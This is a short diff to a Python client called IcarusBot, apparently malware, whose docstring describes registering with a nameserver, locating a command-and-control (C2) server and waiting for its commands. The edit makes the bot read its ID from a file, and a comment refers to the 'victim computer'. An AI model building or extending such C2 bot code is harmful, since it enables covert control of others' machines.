@@ -13,7 +13,7 @@ from win10toast import ToastNotifier
 
 from config import API_URL
 
-BOT_ID_NAME = 'ULTRASTEED'  # Replace this for each new bot handed out.
+BOT_ID_NAME = ''  # Replace this for each new bot handed out.
 
 
 class IcarusBot:
@@ -23,14 +23,20 @@ class IcarusBot:
 
     def __init__(self):
         """
-        The process of the init is:
-            1. Setup basics
-            2. Start updating with nameserver (let it know we exist) as a separate 'Thread'
-            3. Ask the nameserver where the active C2 server is. It will continue asking every 5 seconds until told.
-            4. It will then bind with the ip::port of the C2, then sending a basic status update.
-            5. It will then call the main_loop(), which will sit and wait for a response from the C2 server for a command.
-                5.1: Refer to the main_loop() function for details about how it handles the protocol.
+                The process of the init is:
+                    1. Setup basics
+                    2. Start updating with nameserver (let it know we exist) as a separate 'Thread'
+                    3. Ask the nameserver where the active C2 server is. It will continue asking every 5 seconds until told.
+                    4. It will then bind with the ip::port of the C2, then sending a basic status update.
+                    5. It will then call the main_loop(), which will sit and wait for a response from the C2 server for a command.
+                        5.1: Refer to the main_loop() function for details about how it handles the protocol.
         """
+        file = open("bot_name.txt", "r")
+        global BOT_ID_NAME
+        BOT_ID_NAME = file.read()
+        print(BOT_ID_NAME, "IS RUNNING")
+
+
         # self.update_thread = threading.Timer(3.0, self.update)
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # UDP
         self.bot_id = BOT_ID_NAME  # should be random or grabbed somehow from victim computer
